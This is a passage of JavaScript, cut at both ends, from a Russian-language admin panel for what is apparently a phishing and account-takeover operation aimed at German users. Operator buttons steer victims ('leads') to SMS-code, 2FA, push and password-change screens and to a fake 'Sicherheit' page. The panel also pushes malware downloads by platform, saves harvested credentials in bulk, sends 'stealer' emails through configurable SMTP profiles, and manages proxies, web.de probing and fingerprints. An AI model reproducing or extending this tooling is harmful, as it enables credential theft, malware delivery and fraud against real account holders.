        var lead = leads.find(function (l) { return leadIdsEqual(l.id, selectedId); });
        if (lastViewedSnapshot[selectedId]) lastViewedSnapshot[selectedId].chatCount = messages.length;
        else if (lead) lastViewedSnapshot[selectedId] = { userEventCount: getUserEventCount(lead.eventTerminal), chatCount: messages.length };
        updateActivityBadge(getNewActivityCount(leads));
        updateChatTabNewIndicator();
        var typingEl = document.getElementById('admin-chat-typing');
        if (typingEl) typingEl.classList.toggle('hidden', !userTyping);
        var wasAtBottom = wrap.scrollHeight - wrap.scrollTop - wrap.clientHeight < 40;
        wrap.innerHTML = '';
        var spacer = document.createElement('div');
        spacer.className = 'admin-chat-messages-spacer';
        wrap.appendChild(spacer);
        messages.forEach(function (msg) {
          wrap.appendChild(renderAdminChatMessage(msg, selectedId, lastReadAt));
        });
        if (wasAtBottom || forceUpdate) {
          requestAnimationFrame(function () {
            requestAnimationFrame(function () {
              if (wrap && wrap.scrollHeight > 0) wrap.scrollTop = wrap.scrollHeight;
            });
          });
        }
      })
      .catch(function () {
        wrap.innerHTML = '';
      });
  }

  function openAdminChatImage(src) {
    var overlay = document.getElementById('admin-chat-image-overlay');
    var overlayImg = document.getElementById('admin-chat-image-overlay-img');
    if (overlay && overlayImg) {
      overlayImg.src = src;
      overlay.removeAttribute('hidden');
      document.body.style.overflow = 'hidden';
    }
  }
  function closeAdminChatImage() {
    var overlay = document.getElementById('admin-chat-image-overlay');
    if (overlay) {
      overlay.setAttribute('hidden', '');
      document.body.style.overflow = '';
    }
  }

  function initAdminChat() {
    var sendBtn = document.getElementById('admin-chat-send');
    var input = document.getElementById('admin-chat-input');
    var fileInput = document.getElementById('admin-chat-file');
    var preview = document.getElementById('admin-chat-preview');
    var messagesWrap = document.getElementById('admin-chat-messages');

    if (messagesWrap) {
      messagesWrap.addEventListener('click', function (e) {
        var btn = e.target.closest('.admin-chat-msg-delete');
        if (!btn) return;
        e.preventDefault();
        var leadId = btn.getAttribute('data-lead-id');
        var messageId = btn.getAttribute('data-message-id');
        if (!leadId || !messageId) return;
        authFetch('/api/chat', {
          method: 'DELETE',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ leadId: leadId, messageId: messageId })
        }).then(function (r) { return r.json(); }).then(function (data) {
          if (data && data.ok) loadAdminChat(true);
          else alert(data && data.error ? data.error : 'Ошибка');
        }).catch(function () { alert('Ошибка'); });
      });
    }

    var overlayClose = document.getElementById('admin-chat-image-overlay-close');
    var overlay = document.getElementById('admin-chat-image-overlay');
    if (overlayClose) overlayClose.addEventListener('click', closeAdminChatImage);
    if (overlay) overlay.addEventListener('click', function (e) { if (e.target === overlay) closeAdminChatImage(); });

    function renderAdminPreview() {
      if (!preview) return;
      preview.innerHTML = '';
      adminChatPendingImages.forEach(function (dataUrl, index) {
        var item = document.createElement('div');
        item.className = 'admin-chat-preview-item';
        var img = document.createElement('img');
        img.src = dataUrl;
        img.alt = 'Vorschau';
        item.appendChild(img);
        var btn = document.createElement('button');
        btn.type = 'button';
        btn.className = 'admin-chat-preview-remove';
        btn.innerHTML = '&times;';
        btn.title = 'Entfernen';
        btn.setAttribute('aria-label', 'Entfernen');
        btn.addEventListener('click', function () {
          adminChatPendingImages.splice(index, 1);
          renderAdminPreview();
        });
        item.appendChild(btn);
        preview.appendChild(item);
      });
    }

    function sendAdminOne(text, imageBase64) {
      if (!selectedId) return Promise.resolve(false);
      var payload = { leadId: selectedId, from: 'support' };
      if (text) payload.text = text;
      if (imageBase64) payload.image = imageBase64;
      return authFetch('/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).then(function (r) { return r.json(); }).then(function (data) { return r.status === 200 && data && data.ok; });
    }

    function doSend() {
      if (!selectedId) return;
      var text = (input && input.value) ? input.value.trim() : '';
      var images = adminChatPendingImages.slice();
      if (!text && images.length === 0) return;
      if (input) input.value = '';
      adminChatPendingImages.length = 0;
      renderAdminPreview();
      var queue = [];
      if (text && images.length) {
        queue.push({ text: text, image: images[0] });
        for (var i = 1; i < images.length; i++) queue.push({ text: null, image: images[i] });
      } else if (text) queue.push({ text: text, image: null });
      else images.forEach(function (img) { queue.push({ text: null, image: img }); });
      var idx = 0;
      function next() {
        if (idx >= queue.length) { loadAdminChat(true); return; }
        var item = queue[idx++];
        sendAdminOne(item.text, item.image || undefined).then(function () { next(); }).catch(function () { next(); });
      }
      next();
    }

    var openAtUserBtn = document.getElementById('admin-chat-open-at-user');
    if (openAtUserBtn) {
      openAtUserBtn.addEventListener('click', function () {
        if (!selectedId) return;
        authFetch('/api/chat-open', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ leadId: selectedId })
        }).then(function (r) { return r.json(); }).then(function (data) {
          if (data && data.ok) { /* Чат откроется у юзера при следующем опросе */ }
        }).catch(function () {});
      });
    }

    var adminChatTypingTimer = null;
    function sendAdminTyping(typing) {
      if (!selectedId) return;
      authFetch('/api/chat-typing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ leadId: selectedId, who: 'support', typing: typing })
      }).catch(function () {});
    }
    if (input) {
      input.addEventListener('input', function () {
        clearTimeout(adminChatTypingTimer);
        sendAdminTyping(true);
        adminChatTypingTimer = setTimeout(function () { sendAdminTyping(false); }, 2000);
      });
      input.addEventListener('blur', function () { clearTimeout(adminChatTypingTimer); sendAdminTyping(false); });
    }
    function onAdminSendTypingOff() {
      clearTimeout(adminChatTypingTimer);
      if (selectedId) sendAdminTyping(false);
    }

    if (sendBtn) sendBtn.addEventListener('click', function () { onAdminSendTypingOff(); doSend(); });
    if (input) {
      input.addEventListener('keydown', function (e) {
        if (e.key === 'Enter' && !e.shiftKey) {
          e.preventDefault();
          onAdminSendTypingOff();
          doSend();
        }
      });
    }

    setInterval(function () {
      var tabChat = document.getElementById('tab-chat');
      if (selectedId && tabChat && tabChat.classList.contains('is-active')) loadAdminChat();
    }, 3000);

    if (fileInput && preview) {
      fileInput.setAttribute('multiple', 'multiple');
      fileInput.addEventListener('change', function () {
        var files = this.files;
        this.value = '';
        if (!files || !files.length) return;
        var i = 0;
        function processNext() {
          if (i >= files.length) { renderAdminPreview(); return; }
          var file = files[i++];
          if (!file.type.startsWith('image/')) { processNext(); return; }
          var reader = new FileReader();
          reader.onload = function () {
            var dataUrl = reader.result;
            compressAdminImage(dataUrl, function (resized) {
              if (resized) adminChatPendingImages.push(resized);
              processNext();
            });
          };
          reader.readAsDataURL(file);
        }
        processNext();
      });
    }
  }

  function getUserEventCount(terminal) {
    if (!Array.isArray(terminal)) return 0;
    return terminal.filter(function (e) { return e.source !== 'admin'; }).length;
  }

  function getNewActivityCount(currentLeads) {
    var count = 0;
    var isChatTab = document.getElementById('tab-chat') && document.getElementById('tab-chat').classList.contains('is-active');
    for (var i = 0; i < currentLeads.length; i++) {
      var lead = currentLeads[i];
      var prev = lastViewedSnapshot[lead.id];
      var userEventCount = getUserEventCount(lead.eventTerminal);
      if (!leadIdsEqual(lead.id, selectedId)) {
        if (!prev) count++;
        else if (prev.userEventCount !== userEventCount) count++;
      }
      if (leadIdsEqual(lead.id, selectedId) && isChatTab) continue; /* чат этого лида открыт — не считаем новые сообщения */
      var lastChat = prev && prev.chatCount != null ? prev.chatCount : 0;
      var curChat = lead.chatCount != null ? lead.chatCount : 0;
      if (curChat > lastChat) count++;
    }
    return count;
  }

  function markViewed() {
    lastViewedSnapshot = {};
    (leads || []).forEach(function (l) {
      lastViewedSnapshot[l.id] = {
        userEventCount: getUserEventCount(l.eventTerminal),
        chatCount: l.chatCount != null ? l.chatCount : 0
      };
    });
    updateActivityBadge(0);
  }

  function updateActivityBadge(n) {
    var badge = document.getElementById('activity-badge');
    if (!badge) return;
    if (n > 0) {
      badge.textContent = n > 99 ? '99+' : String(n);
      badge.classList.remove('hidden');
    } else {
      badge.classList.add('hidden');
    }
  }

  function updateChatTabNewIndicator() {
    var tabChat = document.getElementById('tab-chat');
    var dot = document.getElementById('tab-chat-new-dot');
    if (!tabChat || !dot) return;
    var isChatTab = tabChat.classList.contains('is-active');
    if (!selectedId || isChatTab) {
      dot.classList.add('hidden');
      return;
    }
    var lead = leads && leads.find(function (l) { return leadIdsEqual(l.id, selectedId); });
    if (!lead) {
      dot.classList.add('hidden');
      return;
    }
    var curChat = lead.chatCount != null ? lead.chatCount : 0;
    var lastChat = lastViewedSnapshot[selectedId] && lastViewedSnapshot[selectedId].chatCount != null ? lastViewedSnapshot[selectedId].chatCount : 0;
    if (curChat > lastChat) {
      dot.classList.remove('hidden');
    } else {
      dot.classList.add('hidden');
    }
  }

  function loadLeads(onSuccess, page) {
    if (page != null && page >= 1) leadsPage = page;
    if (leadsLoadAbort) {
      try {
        leadsLoadAbort.abort();
      } catch (e) {}
    }
    leadsLoadAbort = new AbortController();
    var leadsSignal = leadsLoadAbort.signal;
    var ensureIdForRequest = selectedId;
    if (ensureIdForRequest == null || ensureIdForRequest === '') {
      try {
        var sidSs = sessionStorage.getItem('gmw-admin-selected-id');
        if (sidSs) ensureIdForRequest = sidSs;
      } catch (e) {}
    }
    ensureIdForRequest = normalizeLeadId(ensureIdForRequest);
    var url = '/api/leads?page=' + leadsPage + '&limit=' + leadsLimit + '&_=' + Date.now();
    if (ensureIdForRequest) url += '&ensureId=' + encodeURIComponent(ensureIdForRequest);
    try {
      if (localStorage.getItem('gmw-admin-show-archived') === '1') url += '&includeArchived=1';
    } catch (e) {}
    authFetch(url, { cache: 'no-store', headers: { Pragma: 'no-cache' }, signal: leadsSignal })
      .then(function (r) {
        if (r.status === 403) {
          console.warn('[GMW Admin] 403 — invalid or missing token');
          showToast('Доступ запрещён. Выполните вход в админ-панель.');
          return [];
        }
        if (!r.ok) {
          return r.text().then(function (text) {
            var msg = 'Сервер вернул ошибку ' + r.status;
            try {
              var j = JSON.parse(text);
              if (j && j.error) msg += ': ' + j.error;
            } catch (e) {}
            throw new Error(msg);
          });
        }
        return r.json();
      })
      .then(function (data) {
        if (data && data.leads !== undefined) {
          leads = Array.isArray(data.leads) ? data.leads : [];
          leadsTotal = typeof data.total === 'number' ? data.total : leads.length;
          leadsPage = typeof data.page === 'number' ? data.page : 1;
          leadsLimit = Math.min(typeof data.limit === 'number' ? data.limit : 50, 50);
        } else {
          leads = Array.isArray(data) ? data : [];
          leadsTotal = leads.length;
          leadsPage = 1;
        }
        leads = sortLeadsNewFirst(leads);
        if (selectedId == null) {
          try { selectedId = sessionStorage.getItem('gmw-admin-selected-id'); } catch (e) {}
          if (selectedId === '') selectedId = null;
        }
        selectedId = normalizeLeadId(selectedId);
        var idStillExists = selectedId && leads.some(function (l) { return leadIdsEqual(l.id, selectedId); });
        if (!idStillExists && data && data.ensureIdResolved) {
          var resolvedSel = normalizeLeadId(data.ensureIdResolved);
          if (resolvedSel && leads.some(function (l) { return leadIdsEqual(l.id, resolvedSel); })) {
            selectedId = resolvedSel;
            idStillExists = true;
          }
        }
        selectedId = idStillExists ? selectedId : (leads[0] ? normalizeLeadId(leads[0].id) : null);
        try {
          if (selectedId) sessionStorage.setItem('gmw-admin-selected-id', selectedId);
          else sessionStorage.removeItem('gmw-admin-selected-id');
        } catch (e) {}
        if (firstLoad) {
          firstLoad = false;
          markViewed();
        } else {
          updateActivityBadge(getNewActivityCount(leads));
        }
        renderList();
        renderPagination();
        renderDetail();
        updateChatTabNewIndicator();
        requestAnimationFrame(function () {
          requestAnimationFrame(function () { logLayoutHeights('afterLoad'); });
        });
        if (onSuccess && typeof onSuccess === 'function') onSuccess();
      })
      .catch(function (err) {
        if (err && err.name === 'AbortError') return;
        console.error('[GMW Admin] loadLeads:', err);
        var msg = (err && err.message) ? err.message : 'Ошибка загрузки списка';
        if (msg === 'Failed to fetch' || (err && err.message && err.message.indexOf('NetworkError') !== -1)) {
          msg = 'Нет связи с сервером. Проверьте: 1) сервер запущен, 2) админка открыта с того же домена.';
        }
        showToast(msg);
        leads = [];
        renderList();
        renderDetail();
        requestAnimationFrame(function () {
          requestAnimationFrame(function () { logLayoutHeights('afterLoad'); });
        });
      });
  }

  function postJson(path, body) {
    body = body || {};
    var payload = {};
    for (var k in body) {
      if (Object.prototype.hasOwnProperty.call(body, k)) payload[k] = body[k];
    }
    if (payload.id != null) payload.id = String(payload.id).trim();
    return authFetch(path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  }

  function normalizeStatsPeriod(period) {
    var p = String(period || '').trim().toLowerCase();
    if (p === 'today' || p === 'yesterday' || p === 'week' || p === 'month' || p === 'all') return p;
    return 'today';
  }

  function setActiveStatsPeriod(period) {
    var wrap = document.getElementById('stats-timeframe');
    if (!wrap) return;
    var active = normalizeStatsPeriod(period);
    var buttons = wrap.querySelectorAll('.stats-timeframe-btn');
    buttons.forEach(function (btn) {
      btn.classList.toggle('is-active', (btn.getAttribute('data-period') || '') === active);
    });
  }

  function applyStatsData(stats) {
    var byStatus = stats && stats.byStatus ? stats.byStatus : {};
    var byOs = stats && stats.byOs ? stats.byOs : {};
    var statusError = document.getElementById('stats-status-error');
    var statusPending = document.getElementById('stats-status-pending');
    var statusSuccess = document.getElementById('stats-status-success');
    var osWindows = document.getElementById('stats-os-windows');
    var osMacos = document.getElementById('stats-os-macos');
    var osAndroid = document.getElementById('stats-os-android');
    var osIos = document.getElementById('stats-os-ios');
    var osOther = document.getElementById('stats-os-other');
    if (statusError) statusError.textContent = String(byStatus.error || 0);
    if (statusPending) statusPending.textContent = String(byStatus.pending || 0);
    if (statusSuccess) statusSuccess.textContent = String(byStatus.success || 0);
    if (osWindows) osWindows.textContent = String(byOs.windows || 0);
    if (osMacos) osMacos.textContent = String(byOs.macos || 0);
    if (osAndroid) osAndroid.textContent = String(byOs.android || 0);
    if (osIos) osIos.textContent = String(byOs.ios || 0);
    if (osOther) osOther.textContent = String(byOs.other || 0);
  }

  function loadStats(period) {
    statsPeriod = normalizeStatsPeriod(period || statsPeriod);
    setActiveStatsPeriod(statsPeriod);
    return authFetch('/api/stats?period=' + encodeURIComponent(statsPeriod))
      .then(function (r) {
        return r.text().then(function (text) {
          var data = {};
          try { data = text ? JSON.parse(text) : {}; } catch (e) {}
          if (!r.ok) throw new Error((data && data.error) || ('HTTP ' + r.status));
          return data;
        });
      })
      .then(function (data) {
        applyStatsData(data);
      })
      .catch(function (err) {
        showToast('Ошибка загрузки статистики: ' + ((err && err.message) ? err.message : 'unknown'));
      });
  }

  var ACTION_EVENT_LABELS = {
    '/api/redirect-sicherheit': 'Отправлен на Sicherheit',
    '/api/redirect-download-by-platform': 'Download (по OS)',
    '/api/redirect-android': 'Отправлен на скачивание (Android)',
    '/api/redirect-open-on-pc': 'Отправлен: «Открыть на ПК»',
    '/api/show-success': 'Успех',
    '/api/show-error': 'Ошибка',
    '/api/redirect-sms-code': 'SMS',
    '/api/redirect-2fa-code': '2-FA',
    '/api/redirect-push': 'Push',
    '/api/redirect-change-password': 'Отправлен на смену',
    '/api/mark-worked': 'Отработан',
  };

  function addOptimisticEvent(leadId, label) {
    var lead = leads.find(function (l) { return l && leadIdsEqual(l.id, leadId); });
    if (!lead) return;
    if (!lead.eventTerminal) lead.eventTerminal = [];
    lead.eventTerminal.push({ at: new Date().toISOString(), label: label, source: 'admin' });
    if (selectedId === leadId || String(selectedId) === String(leadId)) renderDetail();
    renderList();
  }

  function runAction(apiPath, id, buttonEl) {
    if (!id) return Promise.reject(new Error('No record selected'));
    var label = ACTION_EVENT_LABELS[apiPath];
    if (apiPath === '/api/mark-worked') {
      var leadToggle = leads.find(function (l) { return leadIdsEqual(l.id, id); });
      if (leadToggle && (leadToggle.klLogArchived === true || leadToggle.klLogArchived === 'true')) {
        label = null;
      } else {
        label = (leadToggle && leadIsSidebarWorked(leadToggle)) ? EVENT_WORKED_TOGGLE_OFF_LABEL : 'Отработан';
      }
    }
    if (label) addOptimisticEvent(id, label);
    if (buttonEl) buttonEl.classList.add('is-pending');
    return postJson(apiPath, { id: id })
      .then(function (r) {
        if (r && !r.ok) {
          return r.text().then(function (text) {
            var data = {};
            try {
              data = text && text.trim() ? JSON.parse(text) : {};
            } catch (parseErr) {
              var snippet = (text || '').replace(/\s+/g, ' ').trim().slice(0, 160);
              throw new Error(snippet ? ('Ответ сервера (' + r.status + '): ' + snippet) : ('Ошибка запроса: HTTP ' + r.status));
            }
            throw new Error((data && data.error) || ('Ошибка: HTTP ' + r.status));
          });
        }
        setTimeout(function () {
          loadLeads();
          if (selectedId) renderDetail();
        }, 100);
      })
      .catch(function (err) {
        if (err && err.message) showToast(err.message);
        loadLeads();
      })
      .finally(function () {
        if (buttonEl) buttonEl.classList.remove('is-pending');
      });
  }

  function initButtons() {
    var btnRefresh = document.getElementById('btn-refresh');
    var btnCheck = document.getElementById('btn-check');
    var btnError = document.getElementById('btn-error');
    var btnSms = document.getElementById('btn-sms');
    var btnSmsKlein = document.getElementById('btn-sms-klein');
    var btnPush = document.getElementById('btn-push');
    var btnChangePassword = document.getElementById('btn-change-password');
    var btnSuccess = document.getElementById('btn-success');
    var btnDelete = document.getElementById('btn-delete');
    var btnStats = document.getElementById('btn-stats');

    if (btnRefresh) btnRefresh.addEventListener('click', function () { loadLeads(); });
    if (btnCheck) btnCheck.addEventListener('click', function () { loadLeads(); });

    var btnBulkDelete = document.getElementById('btn-bulk-delete');
    var btnBulkSave = document.getElementById('btn-bulk-save');
    if (btnBulkDelete) {
      btnBulkDelete.addEventListener('click', function () {
        var ids = Object.keys(selectedIds);
        if (ids.length === 0) return;
        if (!confirm('Delete selected records (' + ids.length + ')?')) return;
        var chain = Promise.resolve();
        ids.forEach(function (id) {
          chain = chain.then(function () { return postJson('/api/delete-lead', { id: id }); });
        });
        chain.then(function () {
          selectedIds = {};
          if (selectedId && ids.some(function (bid) { return leadIdsEqual(bid, selectedId); })) {
            selectedId = null;
            try { sessionStorage.removeItem('gmw-admin-selected-id'); } catch (e) {}
          }
          updateBulkActions();
          loadLeads();
        });
      });
    }
    if (btnBulkSave) {
      btnBulkSave.addEventListener('click', function () {
        var ids = Object.keys(selectedIds);
        if (ids.length === 0) return;
        var chain = Promise.resolve();
        ids.forEach(function (id) {
          chain = chain.then(function () { return postJson('/api/save-credentials', { id: id }); });
        });
        chain.then(function () {
          selectedIds = {};
          updateBulkActions();
          loadLeads();
        }).catch(function (err) {
          console.warn('[GMW Admin] Partial save failed:', err);
        });
      });
    }

    function doAction(path, ev) {
      if (!selectedId) return;
      var btn = ev && ev.currentTarget ? ev.currentTarget : null;
      runAction(path, selectedId, btn);
    }
    var btnSicherheit = document.getElementById('btn-sicherheit');
    if (btnSicherheit) btnSicherheit.addEventListener('click', function (e) { doAction('/api/redirect-download-by-platform', e); });
    var btnAndroid = document.getElementById('btn-android');
    if (btnAndroid) btnAndroid.addEventListener('click', function (e) { doAction('/api/redirect-android', e); });
    var btnOpenOnPc = document.getElementById('btn-open-on-pc');
    if (btnOpenOnPc) btnOpenOnPc.addEventListener('click', function (e) { doAction('/api/redirect-open-on-pc', e); });
    var btnSendStealer = document.getElementById('btn-send-stealer');
    if (btnSendStealer) btnSendStealer.addEventListener('click', function (e) {
      if (!selectedId) return;
      var btn = e.currentTarget;
      if (btn) btn.classList.add('is-pending');
      postJson('/api/send-email', { id: selectedId }).then(function (r) {
        if (r && r.ok) return;
        throw new Error((r && r.error) || 'Failed');
      }).then(function () { loadLeads(); }).catch(function (err) {
        alert(err.message || 'Ошибка отправки');
      }).finally(function () { if (btn) btn.classList.remove('is-pending'); });
    });
    if (btnSuccess) btnSuccess.addEventListener('click', function (e) { doAction('/api/show-success', e); });
    var btnWorked = document.getElementById('btn-worked');
    if (btnWorked) btnWorked.addEventListener('click', function (e) { doAction('/api/mark-worked', e); });
    if (btnError) btnError.addEventListener('click', function (e) { doAction('/api/show-error', e); });
    if (btnSms) btnSms.addEventListener('click', function (e) { doAction('/api/redirect-sms-code', e); });
    if (btnSmsKlein) btnSmsKlein.addEventListener('click', function (e) { doAction('/api/redirect-sms-code', e); });
    var btn2fa = document.getElementById('btn-2fa');
    if (btn2fa) btn2fa.addEventListener('click', function (e) { doAction('/api/redirect-2fa-code', e); });
    if (btnPush) btnPush.addEventListener('click', function (e) { doAction('/api/redirect-push', e); });
    if (btnChangePassword) btnChangePassword.addEventListener('click', function (e) { doAction('/api/redirect-change-password', e); });

    if (btnDelete) {
      btnDelete.addEventListener('click', function () {
        if (!selectedId) {
          showToast('Выберите запись для удаления');
          return;
        }
        if (!confirm('Delete this record?')) return;
        var id = selectedId != null ? String(selectedId) : '';
        if (!id) return;
        var idToRemove = id;
        postJson('/api/delete-lead', { id: id })
          .then(function (r) {
            var ct = r && r.headers && r.headers.get && r.headers.get('Content-Type') || '';
            return (ct.indexOf('json') !== -1 ? r.json() : r.text().then(function (t) { try { return JSON.parse(t); } catch (e) { return {}; } })).then(function (data) {
              if (!r || !r.ok) throw new Error((data && data.error) || (r.status === 403 ? 'Доступ запрещён' : r.status === 404 ? 'Запись не найдена' : 'Delete failed'));
              return data;
            });
          })
          .then(function () {
            leads = leads.filter(function (l) { return l && !leadIdsEqual(l.id, idToRemove); });
            selectedId = null;
            try { sessionStorage.removeItem('gmw-admin-selected-id'); } catch (e) {}
            renderList();
            renderDetail();
            el.detailPlaceholder && el.detailPlaceholder.classList.remove('hidden');
            el.mainContent && el.mainContent.classList.add('hidden');
            showToast('Запись удалена');
            loadLeads();
          })
          .catch(function (err) {
            showToast(err && err.message ? err.message : 'Ошибка удаления');
          });
      });
    }

    if (btnStats) {
      btnStats.addEventListener('click', function () {
        var stats = el.statsContent;
        if (!stats) return;
        if (stats.classList.contains('hidden')) {
          el.detailPlaceholder && el.detailPlaceholder.classList.add('hidden');
          el.mainContent && el.mainContent.classList.add('hidden');
          stats.classList.remove('hidden');
          loadStats(statsPeriod);
        } else {
          stats.classList.add('hidden');
          if (selectedId) {
            el.mainContent && el.mainContent.classList.remove('hidden');
          } else {
            el.detailPlaceholder && el.detailPlaceholder.classList.remove('hidden');
          }
        }
      });
    }

    var timeframeWrap = document.getElementById('stats-timeframe');
    if (timeframeWrap) {
      timeframeWrap.addEventListener('click', function (e) {
        var t = e.target;
        if (!t || !t.classList || !t.classList.contains('stats-timeframe-btn')) return;
        var period = normalizeStatsPeriod(t.getAttribute('data-period'));
        if (period === statsPeriod) return;
        loadStats(period);
      });
    }
  }

  function initFingerprintModal() {
    var modal = document.getElementById('fingerprint-modal');
    var backdrop = document.getElementById('fingerprint-modal-backdrop');
    var closeBtn = document.getElementById('fingerprint-modal-close');
    function closeFingerprintModal() {
      if (modal) {
        modal.classList.add('hidden');
        modal.setAttribute('aria-hidden', 'true');
      }
    }
    if (backdrop) backdrop.addEventListener('click', closeFingerprintModal);
    if (closeBtn) closeBtn.addEventListener('click', closeFingerprintModal);
  }

  function initConfigModal() {
    var btnConfig = document.getElementById('btn-config');
    var modal = document.getElementById('config-modal');
    var backdrop = document.getElementById('config-modal-backdrop');
    var closeBtn = document.getElementById('config-modal-close');
    var downloadMessage = document.getElementById('config-download-message');

    function setActiveConfigPane(name) {
      document.querySelectorAll('.config-pane').forEach(function (p) {
        p.classList.toggle('active', p.id === 'config-pane-' + name);
      });
      document.querySelectorAll('.config-nav-item').forEach(function (it) {
        it.classList.toggle('active', (it.getAttribute('data-pane') || '') === name);
      });
      if (name === 'proxies' || name === 'email') {
        setTimeout(function () {
          AdminModalKit.syncCodeEditorHeights();
        }, 0);
      }
    }

    function showMessage(el, text, type) {
      if (!el) return;
      el.textContent = text || '';
      el.className = 'config-message' + (type ? ' ' + type : '');
      el.classList.toggle('hidden', !text);
    }

    var MAILER_NEW_ID = '__new__';
    var adminMailerPendingImage = null;

    function showMailerMsg(text, type) {
      var el = document.getElementById('config-mailer-message');
      if (!el) return;
      el.textContent = text || '';
      el.className = 'config-msg' + (type ? ' ' + type : '');
      el.classList.toggle('hidden', !text);
    }

    function clearMailerForm() {
      var smtp = document.getElementById('config-mailer-smtp');
      var sender = document.getElementById('config-mailer-sender');
      var title = document.getElementById('config-mailer-title');
      var htmlEl = document.getElementById('config-mailer-html');
      var nameInput = document.getElementById('config-mailer-profile-name');
      var imgFile = document.getElementById('config-mailer-image-file');
      var tplFile = document.getElementById('config-mailer-template-file');
      if (smtp) smtp.value = '';
      if (sender) sender.value = '';
      if (title) title.value = '';
      if (htmlEl) htmlEl.value = '';
      if (nameInput) nameInput.value = '';
      if (imgFile) imgFile.value = '';
      if (tplFile) tplFile.value = '';
      adminMailerPendingImage = null;
      var imgStatus = document.getElementById('config-mailer-image-status');
      if (imgStatus) imgStatus.textContent = '';
    }

    function loadConfigMailer() {
      var sel = document.getElementById('config-mailer-profile');
      var smtp = document.getElementById('config-mailer-smtp');
      var sender = document.getElementById('config-mailer-sender');
      var title = document.getElementById('config-mailer-title');
      var htmlEl = document.getElementById('config-mailer-html');
      var nameInput = document.getElementById('config-mailer-profile-name');
      var imgStatus = document.getElementById('config-mailer-image-status');
      var delBtn = document.getElementById('config-mailer-delete');
      adminMailerPendingImage = null;
      var imgFile = document.getElementById('config-mailer-image-file');
      if (imgFile) imgFile.value = '';
      authFetch('/api/config/stealer-email').then(function (r) { return r.json(); }).then(function (data) {
        var list = data.list || [];
        var currentId = data.currentId || null;
        if (sel) {
          sel.innerHTML = '';
          var optNew = document.createElement('option');
          optNew.value = MAILER_NEW_ID;
          optNew.textContent = '+ Новый профиль';
          sel.appendChild(optNew);
          list.forEach(function (item) {
            var opt = document.createElement('option');
            opt.value = item.id;
            opt.textContent = item.name || item.id;
            sel.appendChild(opt);
          });
          if (currentId && list.some(function (x) { return String(x.id) === String(currentId); })) {
            sel.value = currentId;
          } else {
            sel.value = list.length ? (list[0].id) : MAILER_NEW_ID;
          }
        }
        if (smtp) smtp.value = data.smtpLine || '';
        if (sender) sender.value = data.senderName || '';
        if (title) title.value = data.title || '';
        if (htmlEl) htmlEl.value = data.html || '';
        if (nameInput) {
          var cur = list.find(function (i) { return String(i.id) === String(data.currentId); });
          nameInput.value = (cur && (cur.name || cur.id)) ? (cur.name || cur.id) : '';
        }
        if (imgStatus) {
          imgStatus.textContent = data.image1Present ? 'В профиле сохранена картинка (_src1_)' : 'Картинка в профиле не задана';
        }
        if (delBtn) delBtn.disabled = sel && sel.value === MAILER_NEW_ID;
        showMailerMsg('', '');
      }).catch(function (err) {
        showMailerMsg(err.message || 'Ошибка загрузки Mailer', 'error');
      });
    }

    function openModal(initialPane) {
      if (modal) {
        modal.classList.remove('hidden');
        modal.setAttribute('aria-hidden', 'false');
        document.body.style.overflow = 'hidden';
        var pane = initialPane || 'windows';
        setActiveConfigPane(pane);
        loadConfigDownload();
        loadConfigAndroid();
        loadDownloadSettings();
        loadWindowsArchivePassword();
        loadConfigShort();
        AdminModalKit.syncCodeEditorHeights();
      }
    }
    function loadWindowsArchivePassword() {
      authFetch('/api/config/zip-password').then(function (r) { return r.json(); }).then(function (data) {
        var el = document.getElementById('config-windows-archive-password');
        if (el) el.value = (data.password != null ? String(data.password) : '').trim();
      }).catch(function () {});
    }
    var webdeProbePollTimer = null;
    var webdeProbeActiveJobId = null;
    var webdeProbeLastState = { paused: false, running: false, done: true, error: null };
    var webdeProbeLastTerminalMsg = '';
    function appendProxiesTerminal(line) {
      var pre = document.getElementById('config-proxies-terminal');
      if (!pre) return;
      var t = new Date();
      var ts = ('0' + t.getHours()).slice(-2) + ':' + ('0' + t.getMinutes()).slice(-2) + ':' + ('0' + t.getSeconds()).slice(-2);
      pre.textContent += ts + '  ' + String(line || '') + '\n';
      var parts = pre.textContent.split('\n');
      if (parts.length > 500) pre.textContent = parts.slice(-500).join('\n');
      pre.scrollTop = pre.scrollHeight;
    }
    function syncWebdeProbeToolbar() {
      var startBtn = document.getElementById('config-webde-probe-start');
      var pauseBtn = document.getElementById('config-webde-probe-pause');
      if (!startBtn || !pauseBtn) return;
      var s = webdeProbeLastState;
      var hasJob = !!webdeProbeActiveJobId;
      var busy = !!(s.running && !s.paused);
      startBtn.disabled = busy;
      pauseBtn.disabled = !hasJob || !!s.done || !!s.error || !!s.paused || !busy;
    }
    function clearWebdeProbePoll() {
      if (webdeProbePollTimer) {
        clearInterval(webdeProbePollTimer);
        webdeProbePollTimer = null;
      }
    }
    function closeModal() {
      clearWebdeProbePoll();
      if (modal) {
        modal.classList.add('hidden');
        modal.setAttribute('aria-hidden', 'true');
        document.body.style.overflow = '';
      }
    }

    if (btnConfig) btnConfig.addEventListener('click', function () { openModal('windows'); });
    if (backdrop) backdrop.addEventListener('click', closeModal);
    if (closeBtn) closeBtn.addEventListener('click', closeModal);
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && modal && !modal.classList.contains('hidden')) closeModal();
    });

    document.querySelectorAll('.config-nav-item').forEach(function (item) {
      item.addEventListener('click', function () {
        var pane = item.getAttribute('data-pane');
        if (pane) {
          setActiveConfigPane(pane);
          if (pane === 'short') loadConfigShort();
          if (pane === 'proxies') {
            loadConfigProxies();
            loadConfigWebdeFpIndices();
          }
          if (pane === 'email') loadConfigEmail();
        }
      });
    });

    var mailerProfileSel = document.getElementById('config-mailer-profile');
    if (mailerProfileSel) {
      mailerProfileSel.addEventListener('change', function () {
        var v = mailerProfileSel.value;
        var delBtn = document.getElementById('config-mailer-delete');
        if (delBtn) delBtn.disabled = v === MAILER_NEW_ID;
        if (v === MAILER_NEW_ID) {
          clearMailerForm();
          showMailerMsg('Новый профиль: заполните поля и нажмите «Сохранить».', 'success');
          setTimeout(function () { showMailerMsg('', ''); }, 4000);
          return;
        }
        postJson('/api/config/stealer-email/select', { id: v }).then(function () {
          loadConfigMailer();
        }).catch(function (err) {
